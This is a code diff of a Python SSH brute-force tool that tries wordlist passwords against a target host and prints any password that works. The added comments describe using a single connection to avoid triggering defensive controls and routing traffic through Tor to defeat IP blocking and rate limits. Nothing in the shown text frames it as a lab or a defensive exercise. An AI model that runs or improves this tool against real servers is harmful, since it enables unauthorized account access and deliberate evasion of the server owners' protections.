@@ -3,7 +3,14 @@
 import sys, os
 from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
 
-# Due to the robust security protocols integrated within SSH, parallel attacks are considerably less effective. Consequently, I opted to employ a single attack connection
+# Many SSH servers implement rate-limiting and other security mechanisms
+# that restrict concurrent authentication attempts. For this reason,
+# a single-connection strategy is used to maximize compatibility and
+# reduce the likelihood of triggering defensive controls.
+
+# Outbound connections are routed through the Tor network, providing
+# an additional layer of anonymity and reducing the effectiveness of
+# IP-based blocking and rate-limiting mechanisms
 
 def get_encoder():
     print("\n[INFO] This option is only valid for SSH services exposed on the Internet (not for local testing)")
@@ -22,22 +29,15 @@ def ssh(passwords, hostname, username, port):
         client.set_missing_host_key_policy(AutoAddPolicy())
         try:
             client.connect(hostname, port=port, username=username, password=pwd, timeout=5)
-            stdin, stdout, stderr = client.exec_command('echo "Ready"')
-            output = stdout.read().decode().strip()
-
-            if output == "Ready":
-                print("\n" + "=" * 50)
-                print("=" * 50)
-                print("[ PASSWORD FOUND ]".center(50))
-                print("=" * 50)
-                print(f">>> Recovered Password: {pwd}".center(50))
-                print("=" * 50 + "\n")
-                if pwd != pwd.strip():
-                   print("[WARNING:] The password contains leading or trailing whitespace")
-
-                client.close()
-                sys.exit(0)
-
+            print("\n" + "=" * 50)
+            print("=" * 50)
+            print("[ PASSWORD FOUND ]".center(50))
+            print("=" * 50)
+            print(f">>> Recovered Password: {pwd}".center(50))
+            print("=" * 50 + "\n")
+            if pwd != pwd.strip():
+                print("[WARNING:] The password contains leading or trailing whitespace")
+            sys.exit(0)
 
         except AuthenticationException:
             print(f"[*] Trying password:- {pwd}")
@@ -72,6 +72,7 @@ def read_dic(dic_path, port, hostname, username, encoder):
        if last_line:
          ssh([last_line], hostname, username, port)
 
+    print("[FINISH]>> PASSWORD NOT FOUND")
 
 def main():
     try:
